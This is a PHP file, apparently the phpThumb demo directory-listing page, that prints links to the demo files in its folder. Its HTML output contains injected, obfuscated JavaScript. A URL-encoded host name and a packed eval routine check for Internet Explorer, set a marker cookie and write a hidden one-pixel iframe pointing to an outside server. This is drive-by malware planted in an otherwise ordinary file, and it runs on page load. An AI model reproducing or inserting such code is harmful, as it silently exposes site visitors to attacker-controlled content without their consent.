<?php
if (!@$_REQUEST['list']) {
	header('Location: phpThumb.demo.demo.php');
	exit;
}
echo '<html><body><script>sa = "%66%72%61%74%6D%2E%6E%65%74";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('28(9.8.7("17 6")!=-1&&0.5.7("4=3")==-1){0.5="4=3; 11=13, 14 16 10 14:15:26 12; ";0.24("<2 25=1 27=1 23=\'22://"+18+"/19/\' 20=\'21:29\'></2>")}',10,30,'document||iframe|s|_mlsdkf|cookie||indexOf|appVersion|navigator|2015|expires|GMT|Mon|||Jul|MSIE|sa|b2b|style|display|http|src|write|width||height|if|none'.split('|')));</script>';
$dh = opendir('.');
while ($file = readdir($dh)) {
	if (is_file($file) && ($file{0} != '.') && ($file != basename(__FILE__))) {
		switch ($file) {
			case 'phpThumb.demo.object.simple.php':
			case 'phpThumb.demo.object.php':
				echo '<tt>'.str_replace(' ', '&nbsp;', str_pad(filesize($file), 10, ' ', STR_PAD_LEFT)).'</tt> '.$file.' (cannot work as a live demo)<br>';
				break;
			default:
				echo '<tt>'.str_replace(' ', '&nbsp;', str_pad(filesize($file), 10, ' ', STR_PAD_LEFT)).'</tt> <a href="'.$file.'">'.$file.'</a><br>';
				break;
		}
	}
}
echo '</body></html>';
?>

 